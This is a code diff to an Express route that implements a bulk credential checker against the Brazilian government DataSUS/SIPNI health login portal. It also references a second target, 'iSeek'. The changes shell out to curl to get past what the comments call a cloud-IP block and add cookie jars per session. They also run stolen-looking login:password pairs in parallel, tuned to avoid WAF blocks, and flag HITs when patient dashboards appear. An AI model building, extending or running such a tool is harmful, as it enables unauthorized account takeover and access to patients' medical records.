@@ -1,7 +1,68 @@
 import { Router, type IRouter } from "express";
-import { createHash } from "node:crypto";
+import { createHash }  from "node:crypto";
+import { execFile }    from "node:child_process";
+import { unlinkSync }  from "node:fs";
 
 const router: IRouter = Router();
+
+// ── curl-based HTTP helper ────────────────────────────────────────────────────
+// Node.js's built-in fetch (undici) times out on DataSUS (cloud-IP block).
+// curl uses the system network stack which has no such restriction.
+// We shell out to curl for DataSUS requests only.
+
+interface CurlResult {
+  statusCode: number;
+  headers:    Record<string, string>;
+  body:       string;
+  location:   string; // value of Location header (from redirect), if any
+}
+
+function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
+  // Base args: silent + dump headers to stdout + timeout
+  const args = ["-s", "--max-time", String(Math.ceil(timeoutMs / 1000)), "-D", "-", ...argv];
+
+  return new Promise((resolve, reject) => {
+    const child = execFile("curl", args, { maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
+      // curl exit-code ≠ 0 is ok as long as we got output (e.g. 302 with --max-redirs 0)
+      if (!stdout && err) return reject(new Error(err.message.split("\n")[0]));
+
+      // Split at first blank line separating headers from body
+      // (may have multiple header blocks if curl followed a redirect for the GET phase)
+      // We want the LAST header block.
+      const blocks = stdout.split(/\r?\n\r?\n/);
+      // Find last block starting with HTTP/
+      let rawHdr = "";
+      let body   = "";
+      for (let i = blocks.length - 1; i >= 0; i--) {
+        if (blocks[i].trimStart().startsWith("HTTP/")) {
+          rawHdr = blocks[i];
+          body   = blocks.slice(i + 1).join("\r\n\r\n");
+          break;
+        }
+      }
+
+      const lines      = rawHdr.split(/\r?\n/);
+      const statusLine = lines[0] ?? "";
+      const statusCode = parseInt(statusLine.split(" ")[1] ?? "0", 10);
+
+      const headers: Record<string, string> = {};
+      for (const line of lines.slice(1)) {
+        const idx = line.indexOf(":");
+        if (idx === -1) continue;
+        const key = line.slice(0, idx).trim().toLowerCase();
+        const val = line.slice(idx + 1).trim();
+        if (!headers[key]) headers[key] = val; // first occurrence wins
+      }
+
+      resolve({ statusCode, headers, body, location: headers["location"] ?? "" });
+    });
+
+    setTimeout(() => {
+      try { child.kill("SIGKILL"); } catch { /**/ }
+      reject(new Error("CURL_TIMEOUT"));
+    }, timeoutMs + 3_000);
+  });
+}
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
@@ -192,95 +253,122 @@ function extractSubmitId(html: string, formId: string): string {
 
 async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
+  // Unique cookie jar per session so parallel checks don't share cookies
+  const cookieFile = `/tmp/datasus_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
 
-  // Step 1: GET login page — extract ViewState, form ID, cookies
-  let getResp: Response;
   try {
-    getResp = await fetch(DATASUS_URL, {
-      headers:  { ...DATASUS_HEADERS },
-      redirect: "follow",
-      signal:   AbortSignal.timeout(DATASUS_TIMEOUT),
-    });
-  } catch (e) {
-    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
-  }
-
-  if (getResp.status !== 200) {
-    return { credential, login, status: "ERROR", detail: `HTTP_${getResp.status}` };
-  }
-
-  const html       = await getResp.text().catch(() => "");
-  const cookieJar  = parseCookieJar(getResp.headers);
-  const viewState  = extractViewState(html);
-  const formId     = extractFormId(html);
-  const submitId   = extractSubmitId(html, formId);
-  const senhaHash  = sha512(password);
-
-  // Step 2: POST with SHA-512 hashed password (JSF form format)
-  const payload = new URLSearchParams({
-    [formId]:                      formId,
-    "javax.faces.ViewState":       viewState,
-    [`${formId}:usuario`]:         login,
-    [`${formId}:senha`]:           senhaHash,
-    [submitId]:                    submitId.includes(":") ? submitId.split(":")[1] : submitId,
-  });
-
-  const postHeaders: Record<string, string> = {
-    ...DATASUS_HEADERS,
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Origin":       "https://sipni.datasus.gov.br",
-    "Referer":      DATASUS_URL,
-    ...(cookieJar ? { "Cookie": cookieJar } : {}),
-  };
-
-  let postResp: Response;
-  try {
-    postResp = await fetch(DATASUS_URL, {
-      method:   "POST",
-      headers:  postHeaders,
-      body:     payload.toString(),
-      redirect: "manual",
-      signal:   AbortSignal.timeout(DATASUS_TIMEOUT),
-    });
-  } catch (e) {
-    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
-  }
-
-  // 302 redirect away from login = LIVE (same logic as Python)
-  if (postResp.status === 302) {
-    const loc = postResp.headers.get("location") ?? "";
-    if (loc && !loc.includes("inicio.jsf")) {
-      return { credential, login, status: "HIT", detail: loc };
+    // ── Step 1: GET login page, save cookies ──────────────────────────────
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "-c", cookieFile,                    // save cookies to jar
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        DATASUS_URL,
+      ], DATASUS_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
     }
-    return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
-  }
 
-  // No redirect — read body and check keywords
-  let body2 = "";
-  try { body2 = (await postResp.text()).toLowerCase(); } catch { /**/ }
+    if (getResult.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
+    }
 
-  if (body2.includes("usuário ou senha inválidos") || body2.includes("senha incorreta") || body2.includes("usuario ou senha invalidos")) {
-    return { credential, login, status: "FAIL", detail: "senha_invalida" };
-  }
-  if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
-    return { credential, login, status: "HIT", detail: "dashboard_found" };
-  }
-  if (body2.includes("inicio.jsf") || body2.includes('type="password"')) {
-    return { credential, login, status: "FAIL", detail: "still_on_login" };
-  }
+    const html      = getResult.body;
+    const viewState = extractViewState(html);
+    const formId    = extractFormId(html);
+    const submitId  = extractSubmitId(html, formId);
+    const senhaHash = sha512(password);
 
-  return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${postResp.status}` };
+    // Build POST body
+    const postPairs = [
+      [formId, formId],
+      ["javax.faces.ViewState", viewState],
+      [`${formId}:usuario`, login],
+      [`${formId}:senha`, senhaHash],
+      [submitId, submitId.includes(":") ? submitId.split(":")[1] : submitId],
+    ];
+    // Escape each value for shell single-quote safety
+    const postData = postPairs
+      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
+      .join("&");
+
+    // ── Step 2: POST (no redirect follow — inspect Location header) ────────
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "-b", cookieFile,                                    // send cookies from jar
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Origin: https://sipni.datasus.gov.br",
+        "-H", `Referer: ${DATASUS_URL}`,
+        "--data-raw", postData,                              // POST body (no shell quoting issues)
+        "--max-redirs", "0",                                 // inspect Location header manually
+        DATASUS_URL,
+      ], DATASUS_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    // 302 redirect away from inicio.jsf = LIVE
+    const code = postResult.statusCode;
+    const loc  = postResult.location;
+    if (code >= 301 && code <= 308) {
+      if (loc && !loc.includes("inicio.jsf")) {
+        return { credential, login, status: "HIT", detail: loc };
+      }
+      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
+    }
+
+    // No redirect — check body keywords
+    const body2 = postResult.body.toLowerCase();
+    if (body2.includes("usu") && (body2.includes("ou senha inv") || body2.includes("senha incorreta"))) {
+      return { credential, login, status: "FAIL", detail: "senha_invalida" };
+    }
+    if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
+      return { credential, login, status: "HIT", detail: "dashboard_found" };
+    }
+    if (body2.includes("inicio.jsf") || body2.includes('type="password"') || body2.includes("type='password'")) {
+      return { credential, login, status: "FAIL", detail: "still_on_login" };
+    }
+
+    return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${code}` };
+  } finally {
+    // Clean up cookie jar
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ── Concurrency pool (no deps needed) ────────────────────────────────────────
+// Runs `fn` for every item with at most `concurrency` tasks in parallel,
+// preserving result order. Fast replacement for p-limit.
+async function pMap<T, R>(
+  items:       T[],
+  fn:          (item: T, idx: number) => Promise<R>,
+  concurrency: number,
+): Promise<R[]> {
+  const results: R[] = new Array(items.length);
+  let next = 0;
+  const worker = async () => {
+    while (next < items.length) {
+      const i = next++;
+      results[i] = await fn(items[i], i);
+    }
+  };
+  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
+  return results;
 }
 
 // ── Runner ────────────────────────────────────────────────────────────────────
+// Concurrency: DataSUS = 3 parallel sessions (conservative — server blocks >3 simultaneous IPs)
+//              iSeek   = 2 parallel (CSRF per session, lower concurrency avoids WAF blocks)
+const CONCURRENCY: Record<CheckerTarget, number> = { datasus: 2, iseek: 2 };
+
 async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
-  const checker = target === "datasus" ? checkDataSUS : checkIseek;
-  const results: CheckResult[] = [];
-  for (const pair of pairs) {
-    const r = await checker(pair.login, pair.password);
-    results.push(r);
-    if (pairs.length > 1) await new Promise(ok => setTimeout(ok, 1_500));
-  }
+  const checker     = target === "datasus" ? checkDataSUS : checkIseek;
+  const concurrency = CONCURRENCY[target];
+
+  const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);
+
   return {
     total:   results.length,
     hits:    results.filter(r => r.status === "HIT").length,
